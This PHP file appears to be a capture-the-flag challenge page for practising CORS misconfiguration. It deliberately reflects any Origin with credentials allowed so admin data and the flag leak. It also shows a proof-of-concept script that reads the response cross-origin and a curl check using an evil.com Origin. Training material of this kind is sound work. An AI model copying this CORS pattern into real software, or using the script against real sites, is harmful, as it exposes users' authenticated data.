<?php
require_once('../flag_helper.php');
$challengeName = 'cors';
$flagManager = getFlagManager();
$flag = $flagManager->getFlag($challengeName);
$message = "";
$apiResponse = "";
$showCorsInfo = false;

// 模拟CORS漏洞：任意Origin都被允许
if (isset($_GET['action']) && $_GET['action'] === 'api') {
    while (ob_get_level() > 0) { ob_end_clean(); }
    
    $origin = $_SERVER['HTTP_ORIGIN'] ?? '*';
    // 漏洞：信任所有Origin
    header('Access-Control-Allow-Origin: ' . $origin);
    header('Access-Control-Allow-Credentials: true');
    header('Content-Type: application/json');
    
    $data = [
        'username' => 'admin',
        'email' => 'admin@internal.com',
        'secret' => $flag,
        'role' => 'administrator'
    ];
    echo json_encode($data);
    exit();
}

if (isset($_GET['action']) && $_GET['action'] === 'demo') {
    $showCorsInfo = true;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['answer'])) {
    $answer = trim($_POST['answer']);
    if ($answer === $flag) {
        $message = "success";
    } else {
        $message = "error";
    }
}
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>CORS跨域漏洞 - HiveYarnZinc</title>
        <?php require_once '../progress_helper.php'; ?>
<style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Courier New', monospace; background: #0a0a0f; color: #00ff00; min-height: 100vh; padding: 20px; }
        .container { max-width: 900px; margin: 0 auto; }
        .header { text-align: center; margin-bottom: 40px; padding: 30px; border-bottom: 2px solid #ff4444; }
        .header h1 { font-size: 2.5em; color: #ff4444; text-shadow: 0 0 20px #ff4444; }
        .back-link { color: #00ffff; text-decoration: none; }
        .info-box { background: rgba(255,68,68,0.05); border: 1px solid #ff4444; border-radius: 10px; padding: 25px; margin-bottom: 30px; }
        .cors-box { background: #000; border: 2px solid #ff4444; border-radius: 15px; padding: 30px; margin-bottom: 30px; }
        .cors-box a { color: #0ff; margin: 5px; display: inline-block; padding: 10px 20px; border: 1px solid #ff4444; border-radius: 5px; text-decoration: none; }
        .cors-box a:hover { background: rgba(255,68,68,0.2); }
        .api-response { background: #1a1a2e; padding: 20px; border-radius: 5px; margin-top: 15px; white-space: pre-wrap; color: #0f0; }
        .poc-box { background: #1a1a2e; padding: 20px; border-radius: 5px; margin: 15px 0; color: #ff0; font-size: 0.9em; }
        .result { padding: 20px; border-radius: 10px; text-align: center; margin-bottom: 20px; }
        .result.success { background: rgba(0,255,0,0.1); border: 2px solid #00ff00; color: #00ff00; }
        .result.error { background: rgba(255,0,0,0.1); border: 2px solid #ff0000; color: #ff0000; }
        .submit-box { background: rgba(0,0,0,0.8); border: 2px dashed #ff4444; border-radius: 15px; padding: 40px; text-align: center; }
        .submit-box input { width: 100%; max-width: 400px; padding: 15px; background: #000; border: 1px solid #ff4444; color: #ff4444; font-size: 1.2em; border-radius: 5px; text-align: center; font-family: 'Courier New', monospace; }
        .submit-box button { margin-top: 20px; padding: 15px 50px; background: linear-gradient(135deg, #ff4444, #cc0000); border: none; border-radius: 5px; color: #fff; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header"><h1>🔗 CORS跨域漏洞</h1><a href="../index.php" class="back-link">[ ← 返回首页 ]</a></div>
        <div class="info-box"><h3>💡 题目描述</h3>
            <p>API端点配置了不安全的CORS策略，允许任意来源读取敏感数据。<br>
            <strong>目标:</strong> 利用CORS跨域读取用户敏感信息<br>
            <span style="color:#ff0;">提示:</span> API返回JSON格式的用户数据</p>
        </div>
        
        <div class="cors-box">
            <h3 style="color:#ff4444;margin-bottom:15px;">🔓 用户API</h3>
            <a href="?action=api">📡 查看API响应（直接访问）</a>
            <a href="?action=demo">📖 查看漏洞利用代码</a>
            
            <?php if (isset($_GET['action']) && $_GET['action'] === 'api'): ?>
            <div class="api-response"><strong style="color:#ff4444;">API响应 (直接访问):</strong><br><?= htmlspecialchars(json_encode(['username'=>'admin','email'=>'admin@internal.com','secret'=>'HiveYarnZinc{...}','role'=>'administrator'], JSON_PRETTY_PRINT)) ?></div>
            <?php endif; ?>
            
            <?php if ($showCorsInfo): ?>
            <div class="poc-box">
// CORS漏洞利用POC (HTML):<br>
&lt;script&gt;<br>
var xhr = new XMLHttpRequest();<br>
xhr.open('GET', 'http://localhost:8080/cors/?action=api', true);<br>
xhr.withCredentials = true;<br>
xhr.onload = function() {<br>
&nbsp;&nbsp;alert(xhr.responseText); // 读取敏感数据<br>
&nbsp;&nbsp;// 将数据发送到攻击者服务器<br>
};<br>
xhr.send();<br>
&lt;/script&gt;
            </div>
            <?php endif; ?>
        </div>
        
        <div class="info-box"><h3>🔧 检测命令</h3>
            <pre style="background:#000;padding:15px;border-radius:5px;color:#0f0;">curl -H "Origin: https://evil.com" -I http://localhost:8080/cors/?action=api
# 检查响应头: Access-Control-Allow-Origin</pre>
        </div>
        
        <?php if ($message === 'success'): ?>
        <div class="result success"><h2>🎉 恭喜！</h2><p>Flag正确！</p></div>
        <?php elseif ($message === 'error'): ?>
        <div class="result error"><h2>❌ 错误</h2><p>Flag不正确！</p></div>
        <?php endif; ?>
        
        <div class="submit-box">
            <h3 style="color:#ff4444;margin-bottom:20px;">📝 提交Flag</h3>
            <form method="POST">
                <input type="text" name="answer" placeholder="HiveYarnZinc{...}">
                <button type="submit">[ 提交 ]</button>
            </form>
        </div>
    </div>
</body>
</html>
